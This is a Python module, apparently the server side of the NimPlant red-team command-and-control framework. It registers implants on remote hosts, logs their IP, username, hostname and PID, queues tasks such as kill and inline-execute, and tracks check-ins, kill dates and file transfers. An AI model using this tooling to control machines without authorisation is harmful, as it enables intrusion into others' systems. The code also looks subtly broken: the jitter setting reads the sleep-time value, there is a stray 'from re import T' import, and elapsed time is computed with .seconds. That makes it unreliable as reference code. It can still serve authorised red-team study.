import datetime, itertools, random, string
from re import T
from secrets import choice
from .config import config
from .func import *
from .db import *

# Parse configuration from 'config.toml'
try:
    initialSleepTime = config["nimplant"]["sleepTime"]
    initialSleepJitter = config["nimplant"]["sleepTime"]
    killDate = config["nimplant"]["killDate"]
except KeyError as e:
    nimplantPrint(
        f"ERROR: Could not load configuration, check your 'config.toml': {str(e)}"
    )
    os._exit(1)


class Server:
    def __init__(self):
        self.nimplantList = []  # type: List[NimPlant]
        self.activeNimPlantGuid = None

        self.guid = None
        self.name = None
        self.xorKey = None
        self.killed = False
        self.managementIp = config["server"]["ip"]
        self.managementPort = config["server"]["port"]
        self.listenerType = config["listener"]["type"]
        self.listenerIp = config["listener"]["ip"]
        self.listenerHost = config["listener"]["hostname"]
        self.listenerPort = config["listener"]["port"]
        self.registerPath = config["listener"]["registerPath"]
        self.taskPath = config["listener"]["taskPath"]
        self.resultPath = config["listener"]["resultPath"]
        self.riskyMode = config["nimplant"]["riskyMode"]
        self.sleepTime = config["nimplant"]["sleepTime"]
        self.sleepJitter = config["nimplant"]["sleepJitter"]
        self.killDate = config["nimplant"]["killDate"]
        self.userAgent = config["nimplant"]["userAgent"]

    def asdict(self):
        return {
            "guid": self.guid,
            "name": self.name,
            "xorKey": self.xorKey,
            "managementIp": self.managementIp,
            "managementPort": self.managementPort,
            "listenerType": self.listenerType,
            "listenerIp": self.listenerIp,
            "listenerHost": self.listenerHost,
            "listenerPort": self.listenerPort,
            "registerPath": self.registerPath,
            "taskPath": self.taskPath,
            "resultPath": self.resultPath,
            "riskyMode": self.riskyMode,
            "sleepTime": self.sleepTime,
            "sleepJitter": self.sleepJitter,
            "killDate": self.killDate,
            "userAgent": self.userAgent,
            "killed": self.killed,
        }

    def initNewServer(self, name, xorKey):
        self.guid = "".join(
            random.choice(string.ascii_letters + string.digits) for i in range(8)
        )
        self.xorKey = xorKey

        if not name == "":
            self.name = name
        else:
            self.name = self.guid

    def restoreServerFromDb(self):
        prevServer = dbGetPreviousServerConfig()

        self.guid = prevServer["guid"]
        self.xorKey = prevServer["xorKey"]
        self.name = prevServer["name"]

        prevNimplants = dbGetPreviousNimplants(self.guid)
        for prevNimplant in prevNimplants:
            np = NimPlant()
            np.restoreNimplantFromDb(prevNimplant)
            self.add(np)

    def add(self, np):
        self.nimplantList.append(np)

    def selectNimplant(self, id):
        if len(id) == 8:
            # Select by GUID
            res = [np for np in self.nimplantList if np.guid == id]
        else:
            # Select by sequential ID
            res = [np for np in self.nimplantList if np.id == int(id)]

        if res and res[0].active == True:
            nimplantPrint(f"Starting interaction with NimPlant #{res[0].id}.")
            self.activeNimPlantGuid = res[0].guid
        else:
            nimplantPrint("Invalid NimPlant ID.")

    def selectNextActiveNimplant(self):
        guid = [np for np in self.nimplantList if np.active == True][0].guid
        self.selectNimplant(guid)

    def getActiveNimplant(self):
        res = [np for np in self.nimplantList if np.guid == self.activeNimPlantGuid]
        if res:
            return res[0]
        else:
            return None

    def getNimplantByGuid(self, guid):
        res = [np for np in self.nimplantList if np.guid == guid]
        if res:
            return res[0]
        else:
            return None

    def containsActiveNimplants(self):
        for np in self.nimplantList:
            if np.active:
                if np.late:
                    return False
                return True
        return False

    def isActiveNimplantSelected(self):
        if self.activeNimPlantGuid != None:
            return self.getActiveNimplant().active
        else:
            return False

    def kill(self):
        dbKillServer(self.guid)

    def killAllNimplants(self):
        for np in self.nimplantList:
            np.kill()

    def getInfo(self, all=False):
        result = "\n"
        result += "{:<4} {:<8} {:<15} {:<15} {:<15} {:<15} {:<20} {:<20}\n".format(
            "ID",
            "GUID",
            "EXTERNAL IP",
            "INTERNAL IP",
            "USERNAME",
            "HOSTNAME",
            "PID",
            "LAST CHECK-IN",
        )
        for np in self.nimplantList:
            if all or np.active == True:
                result += (
                    "{:<4} {:<8} {:<15} {:<15} {:<15} {:<15} {:<20} {:<20}\n".format(
                        np.id,
                        np.guid,
                        np.ipAddrExt,
                        np.ipAddrInt,
                        np.username,
                        np.hostname,
                        f"{np.pname} ({np.pid})",
                        f"{np.lastCheckin} ({np.getLastCheckinSeconds()}s ago)",
                    )
                )

        return result.rstrip()

    def get_info(self):
        np_serverInfo = []
        for np in self.nimplantList:
            np_serverInfo.append(np.get_info())

        return {"nimplants": np_serverInfo}

    def checkLateNimplants(self):
        for np in self.nimplantList:
            np.isLate()


# Class to contain data and status about connected implant
class NimPlant:
    newId = itertools.count(start=1)

    def __init__(self):
        self.id = str(next(self.newId))
        self.guid = "".join(
            random.choice(string.ascii_letters + string.digits) for i in range(8)
        )
        self.active = False
        self.late = False
        self.ipAddrExt = None
        self.ipAddrInt = None
        self.username = None
        self.hostname = None
        self.osBuild = None
        self.pid = None
        self.pname = None
        self.riskyMode = None
        self.sleepTime = initialSleepTime
        self.sleepJitter = initialSleepJitter
        self.killDate = killDate
        self.firstCheckin = None
        self.lastCheckin = None
        self.pendingTasks = []  # list of dicts {"guid": X, "task": Y}
        self.hostingFile = None
        self.receivingFile = None

        # Generate random, 16-char key for crypto operations
        self.cryptKey = "".join(
            choice(string.ascii_letters + string.digits) for x in range(16)
        )

    def activate(
        self, ipAddrExt, ipAddrInt, username, hostname, osBuild, pid, pname, riskyMode
    ):
        self.active = True
        self.ipAddrExt = ipAddrExt
        self.ipAddrInt = ipAddrInt
        self.username = username
        self.hostname = hostname
        self.osBuild = osBuild
        self.pid = pid
        self.pname = pname
        self.riskyMode = riskyMode
        self.firstCheckin = timestamp()
        self.lastCheckin = timestamp()

        nimplantPrint(
            f"NimPlant #{self.id} ({self.guid}) checked in from {username}@{hostname} at '{ipAddrExt}'!\n"
            f"OS version is {osBuild}."
        )

        # Create new Nimplant object in the database
        dbInitNimplant(self, np_server.guid)

    def restoreNimplantFromDb(self, dbNimplant):
        self.id = dbNimplant["id"]
        self.guid = dbNimplant["guid"]
        self.active = dbNimplant["active"]
        self.late = dbNimplant["late"]
        self.ipAddrExt = dbNimplant["ipAddrExt"]
        self.ipAddrInt = dbNimplant["ipAddrInt"]
        self.username = dbNimplant["username"]
        self.hostname = dbNimplant["hostname"]
        self.osBuild = dbNimplant["osBuild"]
        self.pid = dbNimplant["pid"]
        self.pname = dbNimplant["pname"]
        self.riskyMode = dbNimplant["riskyMode"]
        self.sleepTime = dbNimplant["sleepTime"]
        self.sleepJitter = dbNimplant["sleepJitter"]
        self.killDate = dbNimplant["killDate"]
        self.firstCheckin = dbNimplant["firstCheckin"]
        self.lastCheckin = dbNimplant["lastCheckin"]
        self.hostingFile = dbNimplant["hostingFile"]
        self.receivingFile = dbNimplant["receivingFile"]
        self.cryptKey = dbNimplant["cryptKey"]

    def checkIn(self):
        self.lastCheckin = timestamp()
        self.late = False
        if self.pendingTasks:
            for t in self.pendingTasks:
                if t["task"] == "kill":
                    self.active = False
                    nimplantPrint(
                        f"NimPlant #{self.id} killed.", self.guid, taskGuid=t["guid"]
                    )

        dbUpdateNimplant(self)

    def getLastCheckinSeconds(self):
        if self.lastCheckin is None:
            return None
        lastCheckinDatetime = datetime.strptime(self.lastCheckin, timestampFormat)
        nowDatetime = datetime.now()
        return (nowDatetime - lastCheckinDatetime).seconds

    def isActive(self):
        if not self.active:
            return False
        return self.active

    def isLate(self):
        # Check if the check-in is taking longer than the maximum expected time (with a 10s margin)
        if self.active == False:
            return False

        if self.getLastCheckinSeconds() > (
            self.sleepTime + (self.sleepTime * (self.sleepJitter / 100)) + 10
        ):
            if self.late:
                return True

            self.late = True
            nimplantPrint("NimPlant is late...", self.guid)
            dbUpdateNimplant(self)
            return True
        else:
            self.late = False
            return False

    def kill(self):
        self.addTask("kill")

    def getInfo(self):
        return prettyPrint(vars(self))

    def getNextTask(self):
        task = self.pendingTasks[0]
        self.pendingTasks.remove(task)
        return task

    def addTask(self, task, taskFriendly=None):
        # Log the 'friendly' command separately, for use with B64-driven commands such as inline-execute
        if taskFriendly is None:
            taskFriendly = task

        guid = "".join(
            random.choice(string.ascii_letters + string.digits) for i in range(8)
        )
        self.pendingTasks.append({"guid": guid, "task": task})
        dbNimplantLog(self, taskGuid=guid, task=task, taskFriendly=taskFriendly)
        dbUpdateNimplant(self)
        return guid

    def setTaskResult(self, taskGuid, result):
        if result == "NIMPLANT_KILL_TIMER_EXPIRED":
            # Process NimPlant self destruct
            self.active = False
            nimplantPrint(
                "NimPlant announced self-destruct (kill date passed). RIP.", self.guid
            )
        else:
            # Parse new sleep time if changed
            if result.startswith("Sleep time changed"):
                rsplit = result.split(" ")
                self.sleepTime = int(rsplit[4])
                self.sleepJitter = int(rsplit[6].split("%")[0][1:])

            # Process result
            nimplantPrint(result, self.guid, taskGuid=taskGuid)

        dbUpdateNimplant(self)

    def cancelAllTasks(self):
        self.pendingTasks = []
        dbUpdateNimplant(self)

    def hostFile(self, file):
        self.hostingFile = file
        dbUpdateNimplant(self)

    def stopHostingFile(self):
        self.hostingFile = None
        dbUpdateNimplant(self)

    def receiveFile(self, file):
        self.receivingFile = file
        dbUpdateNimplant(self)

    def stopReceivingFile(self):
        self.receivingFile = None
        dbUpdateNimplant(self)

    def get_info(self):
        return {
            "id": self.id,
            "guid": self.guid,
            "active": self.active,
            "externalIp": self.ipAddrExt,
            "internalIp": self.ipAddrInt,
            "username": self.username,
            "hostname": self.hostname,
            "pid": self.pid,
            "lastCheckIn": self.lastCheckin,
            "osBuild": self.osBuild,
            "sleep": self.sleepTime,
            "jitter": self.sleepJitter,
            "killDate": self.killDate,
            "firstCheckIn": self.firstCheckin,
            "pendingTasks": self.pendingTasks,
            "hostingFile": self.hostingFile,
            "cryptKey": self.cryptKey,
        }


# Initialize global class to keep nimplant objects in
np_server = Server()
